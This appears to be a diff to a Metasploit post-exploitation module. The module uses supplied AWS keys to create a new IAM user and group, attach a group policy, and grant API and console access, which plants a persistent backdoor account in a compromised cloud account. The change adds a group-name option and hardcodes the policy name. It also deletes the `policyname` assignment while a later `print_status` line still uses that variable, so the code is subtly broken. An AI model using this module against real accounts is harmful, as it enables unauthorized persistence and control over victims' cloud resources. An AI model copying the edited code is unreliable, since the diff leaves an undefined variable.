@@ -35,6 +35,7 @@ class MetasploitModule < Msf::Post
     register_options(
       [
         OptString.new('IAM_USERNAME', [false, 'Name of the user to be created (leave empty or unset to use a random name)', '']),
+        OptString.new('IAM_GROUPNAME', [false, 'Name of the group to be created (leave empty or unset to use a random name)', '']),
         OptBool.new('CREATE_API', [true, 'Add access key ID and secret access key to account (API, CLI, and SDK access)', true]),
         OptBool.new('CREATE_CONSOLE', [true, 'Create an account with a password for accessing the AWS management console', true]),
         OptString.new('AccessKeyId', [false, 'AWS access key', '']),
@@ -88,7 +89,7 @@ class MetasploitModule < Msf::Post
     results['UserName'] = username
 
     # create group
-    groupname = username
+    groupname = datastore['IAM_GROUPNAME'].blank? ? username : datastore['IAM_GROUPNAME']
     print_status("Creating group: #{groupname}")
     action = 'CreateGroup'
     doc = call_iam(creds, 'Action' => action, 'GroupName' => groupname)
@@ -96,11 +97,10 @@ class MetasploitModule < Msf::Post
     results['GroupName'] = groupname
 
     # create group policy
-    policyname = username
     print_status("Creating group policy: #{policyname}")
     pol_doc = datastore['IAM_GROUP_POL']
     action = 'PutGroupPolicy'
-    doc = call_iam(creds, 'Action' => action, 'GroupName' => groupname, 'PolicyName' => policyname, 'PolicyDocument' => URI.encode(pol_doc))
+    doc = call_iam(creds, 'Action' => action, 'GroupName' => groupname, 'PolicyName' => 'Policy', 'PolicyDocument' => URI.encode(pol_doc))
     print_results(doc, action)
 
     # add user to group
